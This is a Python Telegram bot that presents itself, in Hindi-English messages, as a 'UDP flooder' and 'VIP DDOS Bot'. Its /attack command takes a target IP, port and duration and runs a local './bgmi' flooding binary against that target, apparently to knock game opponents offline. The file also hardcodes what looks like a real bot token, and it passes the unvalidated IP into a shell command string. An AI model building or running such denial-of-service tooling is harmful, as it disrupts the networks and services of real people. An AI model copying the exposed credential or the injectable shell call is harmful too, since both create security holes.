import asyncio
import sys
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# --- Configuration ---
TELEGRAM_BOT_TOKEN = '8647083732:AAHnRuZw6y7EM4iJrFFqfSxkRhWJosvlcUA'  # Replace with your bot token
ADMIN_USER_ID = 8003600588
ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds

# --- Global Variables ---
bot_start_time = datetime.now()
attack_in_progress = False
attack_end_time = None

# --- Command Handlers ---

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO @NINJAGAMEROP ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n\n"
        "*⚠️ Kaise Use Kare? ⚠️*\n"
        "*Commands ka use karo: /help*\n\n"
        "*💬 Contact Admin: @NINJAGAMEROP*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time

    chat_id = update.effective_chat.id
    args = context.args

    # Check if attack is already running
    if attack_in_progress:
        if attack_end_time:
            remaining_time = (attack_end_time - datetime.now()).total_seconds()
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack already in progress.*", parse_mode='Markdown')
        return

    # Check arguments
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
                "*👉 /attack <ip> <port> <duration>*\n"
                "*📌 Example: /attack 192.168.1.1 26547 240*"
            ),
            parse_mode='Markdown'
        )
        return

    ip, port_str, duration_str = args
    
    try:
        port = int(port_str)
        duration = int(duration_str)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Port and Duration must be numbers.*", parse_mode='Markdown')
        return

    # Check for restricted ports
    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*",
            parse_mode='Markdown'
        )
        return

    # Check duration limit
    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
                "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
            ),
            parse_mode='Markdown'
        )
        return

    # Start Attack
    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
            f"*💣 Target IP: {ip}*\n"
            f"*🔢 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n\n"
            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    
    try:
        # WARNING: Ensure './bgmi' binary exists in the same directory
        command = f"./bgmi {ip} {port} {duration} {13} {600}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute.*",
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ [ATTACK FINISHED] ✅*\n\n"
                f"*💣 Target IP: {ip}*\n"
                f"*🔢 Port: {port}*\n\n"
                "*💥 Attack complete! Ab chill kar! 🚀*"
            ),
            parse_mode='Markdown'
        )

async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    # Simplified since no DB
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    message = (
        f"*📝 Tera info:*\n"
        f"*🆔 User ID: {user_id}*\n"
        f"*😏 Status: Approved*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ @NINJAGAMEROP VIP DDOS Bot Help Menu 🛠️*\n\n"
        "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
        "📜 *Available Commands:* 📜\n\n"
        "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
        "   - *Is command ka use karke tum attack laga sakte ho.*\n"
        "   - *Example: /attack 192.168.1.1 20876 240*\n\n"
        "2️⃣ *💳 /myinfo*\n"
        "   - *Apne account ka status check karne ke liye.*\n\n"
        "3️⃣ *🔧 /uptime*\n"
        "   - *Bot ka uptime check karo.*\n\n"
        "🚨 *Important Tips:* 🚨\n"
        "- *Agar koi dikkat aaye toh admin ko contact karo: @NINJAGAMEROP*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def main():
    # Build the Application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("uptime", uptime))

    # Run the bot
    print("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
